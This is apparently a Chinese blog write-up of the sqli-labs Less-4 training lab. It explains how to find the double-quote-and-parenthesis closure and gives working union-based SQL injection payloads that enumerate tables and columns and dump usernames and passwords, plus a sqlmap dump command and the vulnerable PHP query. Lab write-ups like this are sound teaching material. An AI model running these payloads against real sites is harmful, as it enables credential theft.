---
title: sqli-labs Less-4 Writeup
date: 2026-11-02
category: [Web安全]
tags: [Sqli-labs, SQL注入, 联合查询, 字符型注入]
---
## 一、 漏洞概述
*   **靶场名称**：sqli-labs
*   **关卡**：Less-4
*   **漏洞类型**：基于双引号和括号的字符型 SQL 注入
*   **后端 SQL 语句**：`SELECT * FROM users WHERE id=("$id") LIMIT 0,1`

## 二、 注入点探测与闭合方式判断
在 Less-3 中，闭合方式是单引号加括号 `')`。在 Less-4 中，闭合方式变为了双引号加括号 `")`。

### 1. 正常访问
访问 `?id=1`，页面正常回显：
```text
Your Login name: Dumb
Your Password: Dumb
```

### 2. 单引号试探 (无效)

访问 ?id=1'，页面正常，说明不是单引号闭合。
(原因：1' 被当作完整的字符串塞进了 ("$id") 中，变成了 ("1'"))

### 3. 双引号试探 (报错)

访问 ?id=1"，页面报错，出现 SQL 语法错误：

```text
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1
```

分析：从报错信息 "1"") LIMIT 0,1 可以看出，后台语句是 ("$id")。当我们输入 1" 时，变成了 ("1"")，多出了一个双引号导致语法错误。

### 4. 验证闭合

访问 ?id=1") --+，页面恢复正常回显。
结论：闭合方式为 ")。

## 三、 手工注入实战步骤

### 1. 判断字段数 (Order By)

访问以下 URL，测试字段数量：

```http
?id=1") order by 3 --+
```

页面正常回显。

```http
?id=1") order by 4 --+
```

页面报错，说明当前查询的字段数为 3。

### 2. 确定回显位置 (Union Select)

将 id 赋值为 -1 使其报错，从而显示联合查询的结果。

```http
?id=-1") union select 1,2,3 --+
```

页面回显数字 2 和 3，说明这两个位置可以回显数据。

### 3. 爆出当前数据库名和版本信息

```http
?id=-1") union select 1,database(),version() --+
```

· 数据库名：security
· 版本信息：如 5.7.x

### 4. 爆出所有表名

查 information_schema.tables 表：

```http
?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+
```

得到表名：emails, referers, uagents, users。其中 users 是存放账号密码的关键表。

### 5. 爆出 users 表的字段名

查 information_schema.columns 表：

```http
?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' --+
```

得到字段名：id, username, password。

### 6. 提取账号密码数据

将 username 和 password 拼接到一起（使用 0x3a 代表冒号 : 进行分割），并指定回显在 2 的位置：

```http
?id=-1") union select 1,group_concat(username,0x3a,password),3 from users --+
```

或者分别放在 2 和 3 的位置：

```http
?id=-1") union select 1,group_concat(username),group_concat(password) from users --+
```

四、 自动化工具测试 (以 SQLMap 为例)

如果使用 SQLMap，可以直接指定参数和闭合符号（虽然 SQLMap 通常能自动识别，但指定后速度更快）：

```bash
python sqlmap.py -u "http://your-ip/sqli-labs/Less-4/?id=1" --batch -D security -T users -C username,password --dump
```

(注：SQLMap 识别出双引号和括号闭合后，会自动构造类似 ") AND 1=1 --+ 的 payload)

## 五、 源码分析

查看 Less-4 的 PHP 源码，可以清晰看到漏洞成因：

```php
$id = '"' . $id . '"'; // 将传入的 id 拼接为 "id"
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1"; 
$result=mysql_query($sql);
```

· 成因：代码只是简单地将 $id 包裹在双引号和括号中 ("$id")。当用户传入 1") 时，SQL 语句变为 SELECT * FROM users WHERE id=("1") --+") LIMIT 0,1;，从而实现了闭合与注入。
· 它没有像 Less-1/3 那样对外层加单引号，因此必须使用 ") 闭合。

```
```
